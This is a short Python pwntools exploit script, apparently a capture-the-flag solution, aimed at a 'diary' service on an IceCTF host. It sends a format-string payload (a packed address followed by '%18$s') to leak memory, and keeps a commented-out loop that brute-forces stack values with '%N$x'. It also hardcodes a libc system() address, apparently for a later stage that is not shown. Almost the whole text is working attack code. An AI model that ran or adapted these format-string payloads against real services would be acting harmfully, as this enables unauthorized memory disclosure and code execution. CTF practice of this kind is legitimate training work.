#!/usr/bin/env python

# ' 804874b:       e8 50 fd ff ff          call   80484a0 <fflush@plt>'

from pwn import *
from binascii import unhexlify
from subprocess import *
import struct

context.log_level = 'error'

system_address = 0xf7e2ad80

host = 'diary.vuln.icec.tf'
port = 6501

s = tubes.remote.remote( host, port )
def connect():
	global s

	s = tubes.remote.remote( host, port )
	s.recv()


connect()
def get(message):
	global s
	s.recv()
	s.sendline('1')
	s.recv()
	s.sendline( message )
	s.recv()
	s.sendline( '2' )
	return s.recv().replace('\n','')


print get(struct.pack('<I', 0x804A0A0) + '%18$s')

# # for i in range(100):
# i = 0
# while ( i < 10000 ):
# 	try:
# 		gotten = get( '%' + str(i) + '$x' )
# 		try:
# 			gotten = repr(unhexlify(gotten))
# 		except:
# 			try:
# 				gotten = repr(unhexlify('0'+gotten))
# 			except:
# 				pass
# 			pass
# 		print i, gotten
# 		i += 1
# 	except:
# 		connect()

s.close()